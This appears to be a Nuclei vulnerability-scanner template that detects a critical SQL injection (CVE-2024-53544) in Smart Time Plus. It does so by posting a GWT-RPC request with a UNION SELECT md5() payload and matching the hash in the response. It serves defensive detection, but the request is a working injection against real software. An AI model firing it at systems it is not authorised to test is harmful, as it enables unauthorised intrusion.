id: cve-2024-53544
info:
  name: Smart Time Plus SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: sql-injection,CVE-2024-53544
  description: |
    Detects SQL Injection vulnerability in Smart Time Plus application at /smarttimeplus/MySQLConnection endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/smarttimeplus/MySQLConnection"
    headers:
      Content-Type: text/x-gwt-rpc; charset=utf-8
      X-Gwt-Permutation: ""
    body: |-
      7|0|6|{{BaseURL}}/smarttimeplus/|99F97D9159E5E5154B6415791EF65C43|com.novachron.smarttimeplus.client.DBConn|getCookieNames|java.lang.String/2004016611|999) UNION select md5({{t1}})-- |1|2|3|4|1|5|6|
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "OK"
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "{{t2}}"
